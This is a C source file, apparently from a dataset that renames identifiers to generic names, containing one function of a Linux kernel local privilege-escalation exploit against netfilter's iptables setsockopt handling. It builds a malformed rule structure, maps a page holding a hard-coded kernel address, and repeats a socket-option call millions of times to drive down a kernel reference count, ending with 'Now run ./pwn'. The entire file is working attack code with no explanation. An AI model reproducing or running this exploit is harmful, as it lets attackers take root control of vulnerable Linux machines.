
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_3__ ;
typedef struct TYPE_5__ TYPE_2__ ;
typedef struct TYPE_4__ TYPE_1__ ;


typedef int uint64_t ;
typedef scalar_t__ uint32_t ;
struct xt_standard_target {int dummy; } ;
struct TYPE_5__ {int match; } ;
struct TYPE_4__ {int name; } ;
struct TYPE_6__ {short match_size; TYPE_2__ kernel; TYPE_1__ user; } ;
struct xt_entry_match {TYPE_3__ u; } ;
struct ipt_replace {int num_entries; int num_counters; int size; scalar_t__ valid_hooks; } ;
struct ipt_entry {int target_offset; int next_offset; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (int) ;
 int FUNC_1 (void*) ;
 void* FUNC_2 (int ) ;
 int FUNC_3 (void*,int ,int ) ;
 scalar_t__ FUNC_4 (void*,int,int,int,int ,int ) ;
 int FUNC_5 (char*) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int,int ,int ,void*,int) ;
 int FUNC_8 (int ,int ,int ) ;
 int FUNC_9 (int ,char*) ;

int FUNC_10(void *VAR_6) {
 int VAR_7, VAR_8;
 int VAR_9;
 void *VAR_10;
 struct ipt_replace *VAR_11;
 struct ipt_entry *VAR_12;
 struct xt_entry_match *VAR_13;
 struct xt_standard_target *VAR_14;
 unsigned VAR_15;

 VAR_7 = FUNC_8(VAR_3, VAR_4, VAR_0);

 if (VAR_7 == -1) {
         FUNC_5("socket");
         return -1;
 }

 VAR_10 = FUNC_2(VAR_2);

 if (VAR_10 == ((void*)0)) {
  FUNC_5("malloc");
  return -1;
 }

 FUNC_3(VAR_10, 0, VAR_2);

 VAR_11 = (struct ipt_replace *) VAR_10;
 VAR_11->num_entries = 1;
 VAR_11->num_counters = 1;
 VAR_11->size = sizeof(*VAR_11) + sizeof(*VAR_14) + 0xffff;
 VAR_11->valid_hooks = 0;

 VAR_12 = (struct ipt_entry *) (VAR_10 + sizeof(struct ipt_replace));
 VAR_12->target_offset = 74;
 VAR_12->next_offset = sizeof(*VAR_12) + sizeof(*VAR_13) + sizeof(*VAR_14);

 VAR_13 = (struct xt_entry_match *) (VAR_10 + sizeof(struct ipt_replace) + sizeof(*VAR_12));

 FUNC_9(VAR_13->u.user.name, "icmp");
 void *VAR_16 = (void*)FUNC_4((void *)0x10000, 0x1000, 7, 0x32, 0, 0);
 uint64_t *VAR_17 = (uint64_t *)(VAR_16 + 0x58);
 *VAR_17 = 0xffffffff821de10d;

 uint32_t *VAR_18 = (uint32_t *)((char *)&VAR_13->u.kernel.match + 4);
 *VAR_18 = (uint32_t)VAR_16;

 VAR_13->u.match_size = (short)0xffff;

 VAR_14 = (struct xt_standard_target *)(VAR_10 + sizeof(struct ipt_replace) + 0xffff + 0x8);
 uint32_t *VAR_19 = (uint32_t *)VAR_14;
 *VAR_19 = (uint32_t)VAR_16;

 FUNC_6("[!] Decrementing the refcount. This may take a while...\n");
 FUNC_6("[!] Wait for the \"Done\" message (even if you'll get the prompt back).\n");

 for (VAR_15 = 0; VAR_15 < 0xffffff/2+1; VAR_15++) {
  VAR_9 = FUNC_7(VAR_7, VAR_5, VAR_1, (void *) VAR_10, 66*1024);
 }

 FUNC_0(VAR_7);
 FUNC_1(VAR_10);
 FUNC_6("[+] Done! Now run ./pwn\n");

 return 0;
}
